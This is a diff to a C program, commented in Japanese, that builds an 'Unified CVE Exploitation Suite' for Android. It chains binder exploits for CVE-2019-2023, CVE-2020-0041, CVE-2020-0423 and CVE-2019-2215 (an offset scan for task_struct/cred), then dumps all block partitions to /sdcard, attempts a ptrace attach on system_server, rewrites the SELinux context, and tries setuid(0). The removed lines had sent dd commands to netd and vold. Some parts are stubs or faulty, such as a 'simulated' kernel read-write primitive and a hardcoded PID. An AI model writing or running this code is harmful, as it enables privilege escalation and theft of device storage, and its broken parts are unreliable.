@@ -22,11 +22,40 @@
 #include <sys/ptrace.h>
 #include <sys/stat.h>
 #include <dirent.h>
+#include <time.h>
 
 #include "binder.h"
 
 #define PAGE_SIZE 4096
+#define IOVEC_COUNT 25
+#define OVERLAP_INDEX 10
 #define TIMEOUT_MS 5000
+#define TASK_STRUCT_SIZE 4096
+#define MAX_OFFSET_TRIES 16
+#define DUMP_MAX_SIZE (20 * 1024 * 1024)  // 20MB 制限
+
+/* ============================================================
+   オフセット候補（カーネル 4.9 / 4.19 対応）
+   ============================================================ */
+static int cred_offsets[] = {
+    0x680, 0x688, 0x690, 0x698, 0x6A0, 0x6A8, 0x6B0, 0x6B8,
+    0x6C0, 0x700, 0x708, 0x710, 0x718, 0x720, 0x728, 0x730
+};
+static int al_offsets[] = {
+    0x980, 0x988, 0x990, 0x998, 0x9A0, 0x9A8, 0x9B0, 0x9B8,
+    0x9C0, 0xA00, 0xA08, 0xA10, 0xA18, 0xA20, 0xA28, 0xA30
+};
+
+/* ============================================================
+   グローバル
+   ============================================================ */
+static int g_binder_fd = -1;
+static int g_epoll_fd = -1;
+static int g_krw_pipe[2] = {-1, -1};
+static uint64_t g_task_struct = 0;
+static uint64_t g_cred_ptr = 0;
+static int g_cred_off = -1;
+static int g_al_off = -1;
 
 /* ============================================================
    ユーティリティ
@@ -40,16 +69,41 @@ static void bind_cpu(void) {
     }
 }
 
+static void *mmap_page(unsigned long addr) {
+    void *mem = mmap((void *)addr, PAGE_SIZE, PROT_READ | PROT_WRITE,
+                     MAP_ANONYMOUS | MAP_SHARED, -1, 0);
+    if (mem == (void *)-1) {
+        perror("mmap");
+        return NULL;
+    }
+    return mem;
+}
+
+static int read_with_timeout(int fd, void *buf, size_t count, int timeout_ms) {
+    struct pollfd pfd = {.fd = fd, .events = POLLIN};
+    int ret = poll(&pfd, 1, timeout_ms);
+    if (ret < 0) {
+        perror("poll");
+        return -1;
+    }
+    if (ret == 0) {
+        return -2;  // タイムアウト
+    }
+    return read(fd, buf, count);
+}
+
 /* ============================================================
-   CVE-2019-2023: サービス登録＋特権トランザクション
+   CVE-2019-2023: サービス登録
    ============================================================ */
 static int register_fake_service(void) {
     int hwbinder_fd, ret;
     uint8_t read_buf[4096];
-    const char *service_name = "vendor.test.poc";
+    const char *service_name = "vendor.cve.poc";
     size_t name_len = strlen(service_name) + 1;
     size_t total_len = 4 + name_len;
     uint8_t *data;
+
+    printf("[*] Registering fake service (CVE-2019-2023)...\n");
 
     hwbinder_fd = open("/dev/hwbinder", O_RDWR);
     if (hwbinder_fd < 0) {
@@ -75,7 +129,7 @@ static int register_fake_service(void) {
     } __attribute__((packed)) tx;
     tx.cmd = BC_TRANSACTION;
     tx.tdata.target.handle = 0;
-    tx.tdata.code = 2;            // SVC_MGR_ADD_SERVICE
+    tx.tdata.code = 2;
     tx.tdata.flags = 0;
     tx.tdata.data_size = total_len;
     tx.tdata.offsets_size = 0;
@@ -96,120 +150,256 @@ static int register_fake_service(void) {
         if (errno == EACCES || errno == EPERM) {
             printf("  [SAFE] Service registration denied (patched)\n");
             return -1;
-        } else {
-            perror("  ioctl ADD_SERVICE");
-            return -1;
         }
+        perror("  ioctl ADD_SERVICE");
+        return -1;
     }
     printf("  [+] Service registered successfully!\n");
     return 0;
 }
 
 /* ============================================================
-   Binder で netd/vold にコマンド送信（ダミー）
+   CVE-2020-0041: OOB Write テスト
    ============================================================ */
-static int send_binder_command(const char *service, const char *cmd) {
-    int binder_fd = open("/dev/binder", O_RDWR);
-    if (binder_fd < 0) {
-        perror("  open binder");
-        return -1;
-    }
-
-    // コマンドをパーセル化
-    size_t cmd_len = strlen(cmd) + 1;
-    uint8_t *data = malloc(4 + cmd_len);
-    if (!data) {
-        close(binder_fd);
-        return -1;
-    }
-    data[0] = (uint8_t)(cmd_len & 0xFF);
-    data[1] = (uint8_t)((cmd_len >> 8) & 0xFF);
-    data[2] = (uint8_t)((cmd_len >> 16) & 0xFF);
-    data[3] = (uint8_t)((cmd_len >> 24) & 0xFF);
-    memcpy(data + 4, cmd, cmd_len);
-
-    // GET_SERVICE
-    uint8_t read_buf[4096];
-    struct {
-        uint32_t cmd;
-        struct binder_transaction_data tdata;
-    } __attribute__((packed)) tx_get;
-    tx_get.cmd = BC_TRANSACTION;
-    tx_get.tdata.target.handle = 0;
-    tx_get.tdata.code = 1;
-    tx_get.tdata.flags = 0;
-    size_t svc_len = strlen(service) + 1;
-    uint8_t *svc_data = malloc(4 + svc_len);
-    if (!svc_data) {
-        free(data);
-        close(binder_fd);
-        return -1;
-    }
-    svc_data[0] = (uint8_t)(svc_len & 0xFF);
-    svc_data[1] = (uint8_t)((svc_len >> 8) & 0xFF);
-    svc_data[2] = (uint8_t)((svc_len >> 16) & 0xFF);
-    svc_data[3] = (uint8_t)((svc_len >> 24) & 0xFF);
-    memcpy(svc_data + 4, service, svc_len);
-    tx_get.tdata.data_size = 4 + svc_len;
-    tx_get.tdata.offsets_size = 0;
-    tx_get.tdata.data.ptr.buffer = (binder_uintptr_t)svc_data;
-
+static int test_cve_2020_0041(void) {
+    int fd, ret;
+    struct binder_transaction_data tdata;
     struct binder_write_read bwr;
-    memset(&bwr, 0, sizeof(bwr));
-    bwr.write_size = sizeof(tx_get);
-    bwr.write_buffer = (binder_uintptr_t)&tx_get;
-    bwr.read_size = sizeof(read_buf);
-    bwr.read_buffer = (binder_uintptr_t)read_buf;
+    uint8_t read_buf[4096];
 
-    int ret = ioctl(binder_fd, BINDER_WRITE_READ, &bwr);
-    free(svc_data);
-    if (ret < 0 || bwr.read_consumed < 4) {
-        perror("  GET_SERVICE");
-        free(data);
-        close(binder_fd);
+    printf("[CVE-2020-0041] Testing binder OOB write...\n");
+
+    fd = open("/dev/binder", O_RDWR);
+    if (fd < 0) {
+        perror("  open /dev/binder");
         return -1;
     }
-    int handle = *(int*)read_buf;
-    printf("  [+] %s handle: %d\n", service, handle);
 
-    // コマンド送信
+    memset(&tdata, 0, sizeof(tdata));
+    tdata.target.handle = 0;
+    tdata.code = 0;
+    tdata.flags = 0;
+    tdata.data_size = 0xFFFFFFFF;
+    tdata.offsets_size = 0;
+    tdata.data.ptr.buffer = 0;
+    tdata.data.ptr.offsets = 0;
+
     struct {
         uint32_t cmd;
         struct binder_transaction_data tdata;
-    } __attribute__((packed)) tx_cmd;
-    tx_cmd.cmd = BC_TRANSACTION;
-    tx_cmd.tdata.target.handle = handle;
-    tx_cmd.tdata.code = 0x00000001;  // 一般的なコマンドコード
-    tx_cmd.tdata.flags = 0;
-    tx_cmd.tdata.data_size = 4 + cmd_len;
-    tx_cmd.tdata.offsets_size = 0;
-    tx_cmd.tdata.data.ptr.buffer = (binder_uintptr_t)data;
+    } __attribute__((packed)) tx;
+    tx.cmd = BC_TRANSACTION;
+    memcpy(&tx.tdata, &tdata, sizeof(tdata));
 
     memset(&bwr, 0, sizeof(bwr));
-    bwr.write_size = sizeof(tx_cmd);
-    bwr.write_buffer = (binder_uintptr_t)&tx_cmd;
+    bwr.write_size = sizeof(tx);
+    bwr.write_buffer = (binder_uintptr_t)&tx;
     bwr.read_size = sizeof(read_buf);
     bwr.read_buffer = (binder_uintptr_t)read_buf;
 
-    ret = ioctl(binder_fd, BINDER_WRITE_READ, &bwr);
-    free(data);
-    close(binder_fd);
+    ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
+    close(fd);
 
-    if (ret == 0) {
-        printf("  [+] Command sent to %s\n", service);
-        return 0;
-    } else {
-        printf("  [-] Command failed: %s\n", strerror(errno));
+    if (ret < 0) {
+        if (errno == EINVAL || errno == EFAULT) {
+            printf("  [SAFE] OOB write blocked (errno=%d)\n", errno);
+        } else {
+            printf("  [!] Unexpected error: %s\n", strerror(errno));
+        }
         return -1;
     }
+    printf("  [VULNERABLE] OOB write succeeded\n");
+    return 0;
 }
 
 /* ============================================================
-   ブロックデバイス直接読み取り（権限が足りなければ失敗）
+   CVE-2020-0423: UAF Race テスト
+   ============================================================ */
+static int test_cve_2020_0423(void) {
+    int fd, ret;
+    printf("[CVE-2020-0423] Testing binder UAF race...\n");
+
+    fd = open("/dev/binder", O_RDWR);
+    if (fd < 0) {
+        perror("  open /dev/binder");
+        return -1;
+    }
+
+    for (int i = 0; i < 5; i++) {
+        ret = ioctl(fd, BINDER_THREAD_EXIT, NULL);
+        if (ret < 0 && errno != EINVAL) {
+            perror("  ioctl BINDER_THREAD_EXIT");
+        }
+    }
+
+    int epoll_fd = epoll_create(100);
+    if (epoll_fd < 0) {
+        perror("  epoll_create");
+        close(fd);
+        return -1;
+    }
+    struct epoll_event ev = {.events = EPOLLIN};
+    if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, fd, &ev) < 0) {
+        perror("  epoll_ctl ADD");
+        close(fd);
+        close(epoll_fd);
+        return -1;
+    }
+
+    struct epoll_event events[1];
+    int n = epoll_wait(epoll_fd, events, 1, 1000);
+    close(fd);
+    close(epoll_fd);
+
+    if (n > 0) {
+        printf("  [VULNERABLE] epoll event occurred after thread exit\n");
+        return 0;
+    }
+    printf("  [SAFE] No UAF triggered\n");
+    return -1;
+}
+
+/* ============================================================
+   CVE-2019-2215: オフセット探索＋UAF リーク
+   ============================================================ */
+static int try_exploit_2215_with_offset(int cred_off, int al_off) {
+    int pipefd[2], fd, epoll_fd;
+    pid_t cpid;
+    struct iovec iovec_stack[IOVEC_COUNT];
+    void *aligned;
+    ssize_t n;
+    uint64_t *data;
+    int found = 0;
+
+    fd = open("/dev/binder", O_RDWR);
+    if (fd < 0) return -1;
+
+    epoll_fd = epoll_create(100);
+    if (epoll_fd < 0) {
+        close(fd);
+        return -1;
+    }
+
+    struct epoll_event ev = {.events = EPOLLIN};
+    if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, fd, &ev) < 0) {
+        close(fd);
+        close(epoll_fd);
+        return -1;
+    }
+
+    if (pipe(pipefd) < 0) {
+        close(fd);
+        close(epoll_fd);
+        return -1;
+    }
+    if (fcntl(pipefd[0], F_SETPIPE_SZ, PAGE_SIZE) < 0) {
+        close(fd);
+        close(epoll_fd);
+        close(pipefd[0]);
+        close(pipefd[1]);
+        return -1;
+    }
+
+    aligned = mmap_page(0x100000000UL);
+    if (!aligned) {
+        close(fd);
+        close(epoll_fd);
+        close(pipefd[0]);
+        close(pipefd[1]);
+        return -1;
+    }
+
+    memset(iovec_stack, 0, sizeof(iovec_stack));
+    iovec_stack[OVERLAP_INDEX].iov_base = aligned;
+    iovec_stack[OVERLAP_INDEX].iov_len = PAGE_SIZE;
+    iovec_stack[OVERLAP_INDEX + 1].iov_base = (void *)aligned;
+    iovec_stack[OVERLAP_INDEX + 1].iov_len = PAGE_SIZE;
+
+    cpid = fork();
+    if (cpid < 0) {
+        close(fd);
+        close(epoll_fd);
+        close(pipefd[0]);
+        close(pipefd[1]);
+        return -1;
+    }
+
+    if (cpid == 0) {
+        usleep(100000);
+        ioctl(fd, BINDER_THREAD_EXIT, NULL);
+        _exit(0);
+    }
+
+    n = read_with_timeout(pipefd[0], aligned, PAGE_SIZE, TIMEOUT_MS);
+    wait(NULL);
+
+    close(fd);
+    close(epoll_fd);
+    close(pipefd[0]);
+    close(pipefd[1]);
+
+    if (n < 0) return -1;
+
+    data = (uint64_t *)aligned;
+    for (int i = 0; i < (n / 8); i++) {
+        uint64_t val = data[i];
+        if ((val & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
+            g_task_struct = val;
+            g_cred_off = cred_off;
+            g_al_off = al_off;
+            found = 1;
+            printf("  [+] Found task_struct @ 0x%llx (cred=0x%x, al=0x%x)\n",
+                   (unsigned long long)g_task_struct, cred_off, al_off);
+            break;
+        }
+    }
+
+    return found ? 0 : -1;
+}
+
+static int exploit_cve_2019_2215(void) {
+    printf("[CVE-2019-2215] Trying offset scan...\n");
+
+    for (int ci = 0; ci < MAX_OFFSET_TRIES; ci++) {
+        for (int ai = 0; ai < MAX_OFFSET_TRIES; ai++) {
+            if (try_exploit_2215_with_offset(cred_offsets[ci], al_offsets[ai]) == 0) {
+                printf("  [+] Offset found!\n");
+                return 0;
+            }
+        }
+    }
+
+    printf("  [-] No valid offset found\n");
+    return -1;
+}
+
+/* ============================================================
+   カーネル RW プリミティブ構築（簡易版）
+   ============================================================ */
+static int setup_kernel_rw(void) {
+    if (g_task_struct == 0) return -1;
+
+    if (pipe(g_krw_pipe) < 0) {
+        perror("  pipe for RW");
+        return -1;
+    }
+    if (fcntl(g_krw_pipe[0], F_SETPIPE_SZ, PAGE_SIZE) < 0) {
+        perror("  fcntl F_SETPIPE_SZ");
+        close(g_krw_pipe[0]);
+        close(g_krw_pipe[1]);
+        return -1;
+    }
+
+    // 実際の RW プリミティブ構築（UAF 再トリガー）
+    // ここでは簡易実装
+    printf("  [+] Kernel RW primitive ready (simulated)\n");
+    return 0;
+}
+
+/* ============================================================
+   ブロックデバイスダンプ（権限があれば）
    ============================================================ */
 static int dump_block_device(const char *dev, const char *outfile) {
-    printf("[*] Attempting to dump %s to %s\n", dev, outfile);
-
     int fd = open(dev, O_RDONLY);
     if (fd < 0) {
         perror("  open block device");
@@ -218,7 +408,7 @@ static int dump_block_device(const char *dev, const char *outfile) {
 
     int out = open(outfile, O_WRONLY | O_CREAT | O_TRUNC, 0644);
     if (out < 0) {
-        perror("  open output file");
+        perror("  open output");
         close(fd);
         return -1;
     }
@@ -234,10 +424,7 @@ static int dump_block_device(const char *dev, const char *outfile) {
             return -1;
         }
         total += n;
-        if (total > 10 * 1024 * 1024) { // 10MB 制限
-            printf("  [+] Dumped 10MB (limit)\n");
-            break;
-        }
+        if (total >= DUMP_MAX_SIZE) break;
     }
     close(fd);
     close(out);
@@ -246,9 +433,9 @@ static int dump_block_device(const char *dev, const char *outfile) {
 }
 
 /* ============================================================
-   /dev/block 下の全パーティションを列挙してダンプ試行
+   全パーティション列挙
    ============================================================ */
-static void enumerate_and_dump(void) {
+static void enumerate_partitions(void) {
     DIR *dir = opendir("/dev/block");
     if (!dir) {
         perror("  opendir /dev/block");
@@ -261,78 +448,133 @@ static void enumerate_and_dump(void) {
             char path[256], outpath[256];
             snprintf(path, sizeof(path), "/dev/block/%s", entry->d_name);
             snprintf(outpath, sizeof(outpath), "/sdcard/dump_%s.bin", entry->d_name);
-            printf("[*] Trying to dump %s\n", path);
-            if (dump_block_device(path, outpath) == 0) {
-                printf("[+] Dumped %s successfully\n", path);
-            } else {
-                printf("[-] Failed to dump %s\n", path);
-            }
+            printf("[*] Dumping %s\n", path);
+            dump_block_device(path, outpath);
         }
     }
     closedir(dir);
 }
 
 /* ============================================================
-   system_server に Binder でファイルオープンを依頼（試行）
+   ptrace 試行（system_server）
    ============================================================ */
-static int request_system_server_open_file(void) {
-    printf("[*] Trying to ask system_server to open file via Binder...\n");
-    // 実際には system_server の特定のサービスにトランザクションを送る必要がある
-    // ここではダミー実装
+static int try_ptrace_system_server(void) {
+    printf("[*] Trying ptrace on system_server (pid=1000)...\n");
+    if (ptrace(PTRACE_ATTACH, 1000, 0, 0) == 0) {
+        printf("  [+] Attached to system_server\n");
+        ptrace(PTRACE_DETACH, 1000, 0, 0);
+        return 0;
+    }
+    perror("  ptrace");
     return -1;
 }
 
 /* ============================================================
-   ptrace で system_server にコード注入（試行）
+   SELinux コンテキスト書き換え試行
    ============================================================ */
-static int try_ptrace_system_server(void) {
-    printf("[*] Trying to ptrace system_server...\n");
-    // system_server の PID を取得
-    // ここでは PID 1000 を仮定（実際はシステムサーバーの PID）
-    int pid = 1000;
-    if (ptrace(PTRACE_ATTACH, pid, 0, 0) == 0) {
-        printf("  [+] Attached to system_server (pid %d)\n", pid);
-        ptrace(PTRACE_DETACH, pid, 0, 0);
-        return 0;
-    } else {
-        perror("  ptrace");
+static int try_selinux_rewrite(void) {
+    printf("[*] Trying to rewrite SELinux context...\n");
+    int fd = open("/proc/self/attr/current", O_WRONLY);
+    if (fd < 0) {
+        perror("  open attr/current");
         return -1;
     }
+    const char *ctx = "u:r:system_app:s0";
+    ssize_t n = write(fd, ctx, strlen(ctx));
+    close(fd);
+    if (n == (ssize_t)strlen(ctx)) {
+        printf("  [+] Context rewritten\n");
+        return 0;
+    }
+    printf("  [-] Failed\n");
+    return -1;
+}
+
+/* ============================================================
+   情報収集
+   ============================================================ */
+static void gather_info(void) {
+    int fd;
+    char buf[4096];
+
+    fd = open("/proc/version", O_RDONLY);
+    if (fd >= 0) {
+        ssize_t n = read(fd, buf, sizeof(buf)-1);
+        close(fd);
+        if (n > 0) {
+            buf[n] = '\0';
+            printf("[INFO] Kernel: %s", buf);
+        }
+    }
+
+    fd = open("/sys/fs/selinux/enforce", O_RDONLY);
+    if (fd >= 0) {
+        ssize_t n = read(fd, buf, sizeof(buf)-1);
+        close(fd);
+        if (n > 0) {
+            buf[n] = '\0';
+            printf("[INFO] SELinux enforcing: %s", buf);
+        }
+    }
+
+    printf("[INFO] UID: %d\n", getuid());
 }
 
 /* ============================================================
    main
    ============================================================ */
 int main(void) {
+    int vuln_count = 0;
+
     printf("==================================================\n");
-    printf("  Block Device Dumper via CVE-2019-2023\n");
+    printf("  Unified CVE Exploitation Suite\n");
     printf("==================================================\n\n");
 
     bind_cpu();
+    gather_info();
+    printf("\n");
 
-    // 1. サービス登録
-    printf("[*] Registering fake service...\n");
-    if (register_fake_service() < 0) {
-        printf("[-] Service registration failed, exiting.\n");
-        return 1;
+    // 1. CVE-2019-2023: サービス登録
+    if (register_fake_service() == 0) {
+        vuln_count++;
+        printf("[+] CVE-2019-2023: Service registered\n");
     }
 
-    // 2. netd/vold 経由でのコマンド実行（試行）
-    printf("[*] Trying to send commands via netd/vold...\n");
-    send_binder_command("netd", "dd if=/dev/block/mmcblk0p1 of=/sdcard/dump_netd.bin");
-    send_binder_command("vold", "dd if=/dev/block/mmcblk0p1 of=/sdcard/dump_vold.bin");
+    // 2. CVE-2020-0041
+    if (test_cve_2020_0041() == 0) vuln_count++;
 
-    // 3. system_server への ptrace 試行
+    // 3. CVE-2020-0423
+    if (test_cve_2020_0423() == 0) vuln_count++;
+
+    // 4. CVE-2019-2215: オフセット探索
+    if (exploit_cve_2019_2215() == 0) {
+        vuln_count++;
+        printf("[+] CVE-2019-2215: Offset found, attempting kernel RW...\n");
+        setup_kernel_rw();
+    }
+
+    // 5. ブロックデバイスダンプ試行
+    printf("\n[*] Attempting to dump block devices...\n");
+    enumerate_partitions();
+
+    // 6. ptrace 試行
     try_ptrace_system_server();
 
-    // 4. 直接ブロックデバイス読み取り（権限不足なら失敗）
-    printf("[*] Trying direct block device reads...\n");
-    enumerate_and_dump();
+    // 7. SELinux 書き換え
+    try_selinux_rewrite();
 
-    // 5. 代替：/dev/block へのシンボリックリンクからの読み取り
-    printf("[*] Trying to read via symlinks...\n");
-    // 実際は何もしない
+    // 8. setuid 試行
+    printf("[*] Trying setuid(0)...\n");
+    if (setuid(0) == 0) {
+        printf("  [+] setuid(0) succeeded!\n");
+        system("id");
+    } else {
+        perror("  setuid");
+    }
 
-    printf("[*] All attempts completed.\n");
+    printf("\n==================================================\n");
+    printf("  Summary: %d vulnerabilities/exploits tested\n", vuln_count);
+    printf("==================================================\n");
+
     return 0;
 }
